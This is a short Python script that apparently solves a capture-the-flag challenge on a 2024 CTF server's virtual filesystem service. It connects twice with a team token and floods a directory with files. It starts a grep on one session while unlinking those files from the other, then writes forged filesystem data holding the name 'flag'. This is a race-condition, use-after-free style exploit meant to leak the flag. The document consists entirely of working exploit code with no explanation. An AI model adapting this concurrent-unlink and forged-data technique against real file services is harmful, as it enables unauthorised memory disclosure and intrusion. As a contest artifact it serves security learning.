import socket
import time


TOKEN = "uafd4pzfjyl2j0ye"


def connect():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    sock.connect(("vfs.q.2024.ugractf.ru", 9278))
    sock.recv(4096)
    sock.send(f"{TOKEN}\n".encode())
    sock.recv(4096)
    return sock

sock1 = connect()
sock2 = connect()

sock1.send(f"mkdir /home/guest/mydir3\n".encode())
sock1.recv(4096)

s = b"_" * 4000 + b"\n"
for i in range(3000):
    sock1.send(f"write /home/guest/mydir3/{i} {s.hex()}\n".encode())
cnt = 0
while cnt < 3000:
    cnt += sock1.recv(4096).count(b"$")

sock1.send(f"grep _ /home/guest/mydir3\n".encode())

time.sleep(1)

for i in range(3000):
    sock2.send(f"unlink /home/guest/mydir3/{i}\n".encode())
cnt = 0
while cnt < 3000:
    cnt += sock2.recv(4096).count(b"$")

fake = b"f\x00\x03\x00\x0e\x00\x00\x00flag".ljust(4092, b"\x00") * 3000

sock2.send(f"write /home/guest/t {fake.hex()}\n".encode())
sock2.recv(4096)

while True:
    print(sock1.recv(4096))
